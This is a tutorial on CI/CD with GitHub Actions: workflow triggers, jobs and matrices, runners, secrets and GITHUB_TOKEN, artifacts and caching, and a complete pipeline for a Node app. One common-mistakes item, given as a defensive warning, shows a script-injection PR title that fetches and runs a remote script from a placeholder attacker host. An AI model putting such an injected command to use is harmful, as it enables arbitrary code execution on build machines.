1 CI vs CD & the CI/CD pipeline

Explain like I'm 5

CI is a robot that checks every change the moment you hand it in. CD is the robot then packing it and putting it on the shelf (delivery) — or straight into customers' hands (deployment).

Continuous IntegrationContinuous DeliveryContinuous Deployment
What happens automaticallyBuild + test on every push/PRCI + package + deploy to staging; prod release is one clickCI + package + deploy to prod, no human
Human gate before prod— (no deploy)Yes: manual approvalNo: tests are the gate
Output"Is this commit good?" ✓/✗A release-ready artifact, alwaysCode live minutes after merge
NeedsAutomated tests, small frequent mergesCI + versioned artifacts + scripted deploysAll of that + very good tests, monitoring, fast rollback
In GitHub Actionson: [push, pull_request]environment: production with required reviewersSame job, no reviewers

Recap CI = auto build + test every change. Delivery = always releasable, humans press deploy. Deployment = auto to prod. Pipeline order: build → test → scan → package → deploy, fail fast.

2 GitHub Actions & workflows

Explain like I'm 5

A workflow is a recipe in your repo. An event (a push) rings the bell, GitHub hands the recipe to a fresh computer (runner), and it follows the steps.

event (push, pull_request, schedule, manual)
   │ triggers
   ▼
WORKFLOW   .github/workflows/ci.yml         one YAML file = one workflow; each trigger = a "run"
   ├── JOB lint    runs-on: ubuntu-latest    each job = a fresh runner VM; jobs run in PARALLEL by default
   │     ├── STEP  uses: actions/checkout@v4      ← ACTION: reusable code (owner/repo@version)
   │     ├── STEP  uses: actions/setup-node@v4
   │     └── STEP  run: npm run lint              ← shell command
   └── JOB build   needs: lint               waits for lint; steps of a job share one machine/filesystem
TermMeaning
WorkflowYAML file in .github/workflows/ (any name, .yml/.yaml).
EventWhat starts it (on:).
JobSet of steps on one runner. Has its own runs-on, needs, if.
StepEither uses: an action or run: a command. Runs in order; first failure stops the job.
ActionPackaged step from the Marketplace or your repo: actions/checkout@v4, ./.github/actions/x, docker://alpine:3.20.
RunnerMachine that executes a job (topic 4).

Your first workflow

.github/workflows/hello.yml
name: Hello                        # shown in the Actions tab
on: [push, workflow_dispatch]       # every push + a "Run workflow" button
jobs:
  hello:                             # job id (your choice)
    runs-on: ubuntu-latest           # GitHub-hosted Ubuntu VM
    steps:
      - uses: actions/checkout@v4    # clone the repo into the runner (NOT automatic!)
      - name: Say hello
        run: |                       # | = multi-line script, runs in bash
          echo "Hello ${{ github.actor }} from ${{ runner.os }}"
          echo "Commit $GITHUB_SHA on $GITHUB_REF_NAME"
          ls

Triggers: the on: block

on:
  push:
    branches: [main]                 # only pushes to main (glob ok: 'release/**')
    tags: ['v*']                      # ...or pushing a tag like v1.2.0
    paths-ignore:                    # skip runs when ONLY these changed
      - '**.md'
      - 'docs/**'
  pull_request:
    branches: [main]                 # PRs whose TARGET is main (opened, new commits, reopened)
  workflow_dispatch:                 # manual run: button in UI / gh workflow run
    inputs:
      reason:
        description: Why are you running this?
        type: string
        default: manual
  schedule:
    - cron: '30 2 * * 1'              # min hour day month weekday, in UTC → Mon 02:30 UTC = 08:00 IST
EventUseGotcha
pushCI on branches, release on tagsUse paths or paths-ignore, not both for one event.
pull_requestCheck a PR before mergeRuns on a merge commit (refs/pull/12/merge). From forks: no secrets, read-only token.
workflow_dispatchManual runs with inputs (${{ inputs.reason }})The workflow file must be on the default branch for the button to show.
scheduleNightly builds, weekly dependency checksUTC only, runs on the default branch, can start late at busy times; min interval 5 min.
release, workflow_callOn GitHub Release / reusable workflows—
About the @v4 version pins

This course pins actions/checkout@v4, setup-node@v4, upload-artifact@v4/download-artifact@v4. Newer majors exist (Oct 2026: checkout v7, setup-node v7, upload-artifact v7, download-artifact v8) — mainly a move to the Node 24 runtime; the inputs used on this page are unchanged. Since 23 Sep 2026 GitHub runs every JavaScript action on Node 24 and recommends upgrading old majors. For a new repo, check each action's Releases page and use the latest major. Never use @main.

Common mistakes
  • Workflow never runs → file not in .github/workflows/, branch filter doesn't match, or the YAML is invalid (Actions tab shows "Invalid workflow file" with the line).
  • Forgetting actions/checkout → npm ci fails with ENOENT: no such file or directory, open '.../package.json'. The runner starts empty.
  • Tabs in YAML, or on: keys mis-indented — validate locally with actionlint or your editor's YAML plugin.
Recap Event → workflow (.github/workflows/*.yml) → jobs (parallel, own runner) → steps (uses action or run command). Triggers: push, pull_request, workflow_dispatch, schedule (UTC).

3 Jobs & steps

Explain like I'm 5

Jobs are cooks in separate kitchens working at the same time; steps are one cook's instructions in order. needs says "wait until that cook is done".

Steps: uses vs run

    steps:
      - name: Set up Node                    # label shown in the log
        uses: actions/setup-node@v4          # ACTION; inputs go under with:
        with:
          node-version: 20
          cache: npm
      - name: Install
        run: npm ci                          # SHELL command
      - name: Unit tests
        id: tests                            # id → reference steps.tests.outcome / outputs later
        run: npm test
        working-directory: ./                # cd for this step only
        env:
          NODE_ENV: test                     # env var for this step only
        continue-on-error: false             # true = job continues even if this fails
  • Default shell: bash -e on Linux/macOS, pwsh on Windows. shell: bash adds -o pipefail.
  • Each run is a new process: cd and shell variables don't carry over. Persist with echo "KEY=val" >> "$GITHUB_ENV" (env for later steps) or >> "$GITHUB_OUTPUT" (step output).
  • Steps in a job share the filesystem; different jobs don't — pass files via artifacts (topic 6).

needs, if, timeout, concurrency

concurrency:                                  # one run per branch/PR; newer push cancels the older run
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5                         # default is 360 (6 h!) — always set it
    steps: [...]
  test:
    runs-on: ubuntu-latest                     # no needs → runs in parallel with lint
    steps: [...]
  build:
    needs: [lint, test]                        # waits for BOTH; skipped if either fails
    if: github.event_name != 'schedule'        # job-level condition
    runs-on: ubuntu-latest
    steps:
      - run: ./build.sh
      - name: Dump logs on failure
        if: failure()                          # only when an earlier step failed
        run: docker logs api
      - name: Always clean up
        if: always()                           # even after failure or cancel
        run: docker rm -f api || true
if: status functionStep/job runs when…
success() (default)All previous steps / needed jobs succeeded
failure()Any previous step / needed job failed
always()Always, even if cancelled
cancelled()The run was cancelled

Matrix: one job definition, many combinations

  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false                 # default true = cancel the others when one fails
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22, 24]               # 2 × 3 = 6 jobs
        exclude:
          - os: windows-latest
            node: 24                     # → 5 jobs
        include:
          - os: ubuntu-latest
            node: 24
            coverage: true               # extra variable for one combination
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test

Jobs appear as test (ubuntu-latest, 20), test (windows-latest, 22)… Node 20 is what TaskFlow ships today (it reached end-of-life in Apr 2026, so plan the upgrade); 22 and 24 are the current LTS lines.

Outputs: passing a value from one job to another

  build:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.meta.outputs.tag }}          # 2) expose the step output as a job output
    steps:
      - id: meta
        run: echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"   # 1) step output: tag=sha-4f2a9c1
  publish:
    needs: build                                    # needs.X only works for jobs listed here
    runs-on: ubuntu-latest
    steps:
      - run: echo "Publishing ${{ needs.build.outputs.tag }}"   # 3) read it

Contexts & expressions

${{ … }} is evaluated by GitHub before the step runs (text substitution). In if: you may drop the ${{ }}.

ExpressionPush to mainPull request #12
github.event_namepushpull_request
github.refrefs/heads/mainrefs/pull/12/merge
github.ref_namemain12/merge
github.shapushed commit (4f2a9c1e…)the test merge commit
github.repository / github.actorshauryav/taskflow / shauryav
github.run_number1, 2, 3… per workflow
runner.osLinux, Windows, macOS

Other contexts: env, vars, secrets, matrix, needs, steps, inputs. Functions: contains(), startsWith(github.ref, 'refs/tags/v'), hashFiles('**/package-lock.json'), format(), toJSON(). Most also exist as env vars: $GITHUB_SHA, $GITHUB_REF_NAME, $RUNNER_OS.

Common mistakes
  • Script injection. run: echo "${{ github.event.pull_request.title }}" pastes attacker-controlled text into your script (a PR titled "; curl evil.sh | sh; " runs). Pass it via env: and use "$TITLE".
  • needs.build.outputs.tag is empty → build isn't in this job's needs (only direct dependencies are visible), or the job-level outputs: mapping is missing.
  • cancel-in-progress: true on main can kill a half-finished publish/deploy. Use cancel-in-progress: ${{ github.event_name == 'pull_request' }}.
Recap Jobs: parallel unless needs; gate with if; fan out with matrix; share values via outputs; always set timeout-minutes. Steps: uses+with or run.

4 Runners

Explain like I'm 5

A runner is the computer that does the work. GitHub lends you a clean one per job, or you can bring your own.

  • A runner is a machine running the GitHub Actions runner agent. It polls GitHub, picks up a job whose runs-on labels match, runs the steps, streams logs back.
  • GitHub-hosted: a fresh VM per job, deleted afterwards — nothing survives between jobs (hence artifacts/cache). Pre-installed: git, Docker, Node, Python, Java, kubectl, helm, AWS/Azure CLIs, gh.
  • Labels: ubuntu-latest (moves to newer Ubuntu LTS over time — pin ubuntu-24.04 for stability), ubuntu-22.04, ubuntu-24.04-arm, windows-latest, macos-latest.
GitHub-hostedSelf-hosted

StateClean every jobPersists (caches, Docker images, leftover files)
MaintenanceNoneYou patch OS, tools, runner agent
CostFree for public repos; private repos use plan minutes (Free plan: 2,000/month; Windows/macOS cost more)You pay for the machine
NetworkPublic internet onlyCan reach private networks (internal DB, private K8s API)
HardwareStandard sizes (larger runners paid)Anything: GPUs, big RAM, ARM

Common mistakes
  • Self-hosted runner on a public repo: anyone can open a PR that runs code on your machine. Use them only for private repos.
  • Job stuck at "Waiting for a runner to pick up this job…" → no online runner has all the labels in runs-on (typo, or the runner service is stopped).
  • Assuming files from job A exist in job B — different VMs. Use artifacts.
Recap runs-on picks a runner by labels. Hosted = clean, zero maintenance, public internet. Self-hosted = your hardware/network, your upkeep, private repos only.

5 Secrets, variables & GITHUB_TOKEN

Explain like I'm 5

Secrets are passwords in a locked drawer: the workflow can use them but nobody can read them back, and the log blanks them out.

  • Secrets: encrypted, write-only (UI never shows the value again), masked as *** in logs. For tokens/passwords.
  • Variables: plain-text config (vars.DOCKERHUB_USERNAME, region names). Visible in logs.
  • Levels: repository, environment (only jobs that declare that environment), organization (shared by chosen repos). Most specific wins.

Docker Hub → Account settings → Personal access tokens → create a Read & Write token, then:

$ gh secret set DOCKERHUB_TOKEN               # prompts for the value (stays out of shell history)

$ gh variable set DOCKERHUB_USERNAME --body shauryav
✓ Created variable DOCKERHUB_USERNAME for shauryav/taskflow
$ gh secret list
NAME             UPDATED
DOCKERHUB_TOKEN  less than a minute ago
$ gh secret set KUBECONFIG --env production < kubeconfig.yaml   # environment-level secret

Use them:

      - uses: docker/login-action@v3
        with:
          username: ${{ vars.DOCKERHUB_USERNAME }}     # variable
          password: ${{ secrets.DOCKERHUB_TOKEN }}     # secret → into an action input
      - run: ./scripts/notify.sh
        env:
          SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}  # secret → env var for one step
# what the log shows if someone does: run: echo "token=$SLACK_WEBHOOK"

GITHUB_TOKEN and permissions

  • GitHub creates a GITHUB_TOKEN for every job automatically (${{ secrets.GITHUB_TOKEN }}), scoped to this repo, expiring when the job ends. No setup needed.
  • Declare the least it needs with permissions: (workflow or job level). Anything not listed becomes none.
permissions:
  contents: read           # checkout

jobs:
  pr-comment:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write   # job-level: only this job may comment
    steps:
      - run: gh pr comment "$PR" --repo "$GITHUB_REPOSITORY" --body "✅ Tests passed on Node 20/22/24"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}       # gh CLI reads GH_TOKEN
          PR: ${{ github.event.pull_request.number }}

Environments: approvals before deploy

  deploy:
    needs: [build, publish]
    runs-on: ubuntu-latest
    environment:
      name: production                   # Settings → Environments → production → Required reviewers: shauryav
      url: https://taskflow.example.com  # link shown on the run page
    steps:
      - run: echo "deploying ${{ needs.build.outputs.tag }}"   # real deploy in Session 19

Common mistakes
  • Error: Username and password required from docker/login-action → secret name typo, secret not set, an environment secret used without environment:, or a PR from a fork (forks never receive secrets).
  • Resource not accessible by integration → GITHUB_TOKEN lacks a permission; add it under permissions:.
  • Masking only hides the exact string: echo $TOKEN | base64 or printing part of it leaks it. Never echo secrets; mask derived values with echo "::add-mask::$VALUE".
  • if: secrets.X != '' isn't allowed — map the secret to a job env: and test env.X.
  • A secret committed to Git is compromised even if you delete the file: rotate it first (Session 19).
Recap Tokens → secrets (masked, write-only); config → variables. GITHUB_TOKEN is automatic, set least permissions:. Environments add approvals + scoped secrets. Forks get no secrets.

6 Artifacts & caching

Explain like I'm 5

Artifacts are the finished homework you hand in and keep (reports, builds). Cache is your scratch notes you reuse next time to work faster (downloaded packages).

  • An artifact is a file/folder uploaded from a job: test and coverage reports, build output, a saved Docker image. Download it from the run page, from another job, or with gh run download.
  • With v4: artifact names must be unique within a run and are immutable → matrix jobs need the matrix value in the name.
      - name: Upload coverage report
        if: always()                                 # keep the report even when tests fail
        uses: actions/upload-artifact@v4
        with:
          name: coverage-node${{ matrix.node }}      # unique per matrix job
          path: coverage/                            # file, folder, or glob; several lines allowed
          retention-days: 7                          # default 90
          if-no-files-found: error                   # default warn

  # in a later job (needs: test):
      - uses: actions/download-artifact@v4
        with:
          pattern: coverage-*                        # all matching artifacts...
          merge-multiple: true                       # ...into one folder
          path: all-coverage/
$ gh run download 18233456789 -n coverage-node20 -D ./coverage-node20
$ ls coverage-node20
clover.xml  coverage-final.json  lcov-report  lcov.info

Cache: faster installs

setup-node with cache: npm caches ~/.npm keyed on the hash of package-lock.json — usually all you need. The general form:

      - uses: actions/cache@v4
        with:
          path: ~/.npm
          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}   # exact hit when lockfile unchanged
          restore-keys: |
            ${{ runner.os }}-npm-                                             # fallback: newest partial match

Common mistakes
  • Matrix jobs uploading the same artifact name → Conflict: an artifact with this name already exists on the workflow run. Add ${{ matrix.node }} to the name.
  • setup-node with cache: npm but no committed lockfile → Dependencies lock file is not found in /home/runner/work/taskflow/taskflow. Supported file patterns: package-lock.json,npm-shrinkwrap.json,yarn.lock. Commit package-lock.json.
  • Caching node_modules instead of ~/.npm — npm ci deletes node_modules anyway.
Recap Artifacts = outputs you keep or hand to the next job (unique names, retention). Cache = reusable dependencies keyed by lockfile hash. Different VMs per job → artifacts are how files travel.

7 Build & test pipeline: TaskFlow's ci.yml

Explain like I'm 5

Everything from this page in one recipe: check style, run tests on three Node versions, bake the image, taste it, and only then put it on the shelf.

The scripts CI calls (package.json excerpt; tests use Jest + supertest in test/):

  "scripts": {
    "start": "node server.js",
    "lint": "eslint .",
    "test": "jest"
  }
 trigger: push to main / PR to main / manual / weekly
        │
        ├──► lint ───────────────────┐
        │                            ├──► build ─────────────────────► publish
        └──► test (node 20, 22, 24) ─┘    docker build                  only on push to main
               ↳ artifacts:                smoke test GET /health        docker load → login → push
                 coverage-node20/22/24     ↳ artifact: image.tar.gz      uses secrets.DOCKERHUB_TOKEN
.github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
    paths-ignore:
      - '**.md'
      - 'docs/**'
  pull_request:
    branches: [main]
  workflow_dispatch:
  schedule:
    - cron: '30 2 * * 1'                       # Mondays 08:00 IST: catch breakage from new deps

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  NODE_VERSION: '20'
  IMAGE: shauryav/taskflow-api

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: npm
      - run: npm ci
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22, 24]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm test -- --coverage
      - name: Upload coverage report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: coverage-node${{ matrix.node }}
          path: coverage/
          retention-days: 7

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    outputs:
      tag: ${{ steps.meta.outputs.tag }}
    steps:
      - uses: actions/checkout@v4
      - name: Compute image tag
        id: meta
        run: echo "tag=sha-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
      - name: Build image
        run: docker build -t "$IMAGE:${{ steps.meta.outputs.tag }}" .
      - name: Smoke test
        run: |
          docker run -d --name api -p 3000:3000 "$IMAGE:${{ steps.meta.outputs.tag }}"
          curl --fail --silent --show-error --retry 10 --retry-all-errors --retry-delay 2 \
            http://localhost:3000/health
      - name: Container logs (on failure)
        if: failure()
        run: docker logs api
      - name: Save image
        run: docker save "$IMAGE:${{ steps.meta.outputs.tag }}" | gzip > image.tar.gz
      - uses: actions/upload-artifact@v4
        with:
          name: image
          path: image.tar.gz
          retention-days: 1

  publish:
    needs: build
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: image
      - run: docker load -i image.tar.gz
      - uses: docker/login-action@v3
        with:
          username: ${{ vars.DOCKERHUB_USERNAME }}
          password: ${{ secrets.DOCKERHUB_TOKEN }}
      - name: Push image
        run: docker push "$IMAGE:${{ needs.build.outputs.tag }}"

★ Putting it all together

The big idea

CI means every TaskFlow change is checked automatically; CD means a tested artifact is always ready (delivery) or shipped (deployment). In GitHub Actions an event starts a workflow; its jobs run in parallel on fresh runners unless chained with needs, and each job's steps either uses an action or run a command. ci.yml lints, tests on Node 20/22/24, builds and smoke-tests the image, passes it on as an artifact, and pushes it with a Docker Hub secret only for main. Session 19 adds security scans, GHCR and a Helm deploy to this pipeline.

Quick self-check

Continuous Delivery vs Continuous Deployment — what is the one difference?

Delivery keeps every passing build ready and deploys to production after a manual approval; Deployment releases to production automatically with no human gate.

Jobs lint and test have no needs; build has needs: [lint, test]. In what order do they run, and what if test fails?

lint and test run in parallel; build starts only after both succeed. If test fails, build is skipped (unless it uses if: always()/failure()).

A file created in job build isn't found in job publish. Why, and how do you fix it?

Each job runs on a separate fresh runner, so filesystems aren't shared. Upload it with actions/upload-artifact in build and download it with actions/download-artifact in publish (which needs: build).

What is the difference between uses: and run: in a step?

uses: runs a reusable action (e.g. actions/checkout@v4) configured via with:; run: executes shell commands on the runner.

A PR from a fork fails at docker/login-action with "Username and password required", but PRs from your own branches pass. Why?

Workflows triggered by pull_request from forks don't receive repository secrets (and get a read-only GITHUB_TOKEN), so secrets.DOCKERHUB_TOKEN is empty. Don't log in/push on PRs — gate it with if: github.event_name == 'push'.

Artifact vs cache: which would you use for coverage reports, and which for ~/.npm?

Coverage reports → artifact (an output to keep/download). ~/.npm → cache (reusable input that speeds up later runs; a miss just makes it slower).

What does strategy.matrix.node: [20, 22, 24] with fail-fast: false produce?

Three parallel jobs from one definition — test (20), test (22), test (24) — each with ${{ matrix.node }} set. With fail-fast: false, one failing doesn't cancel the others.
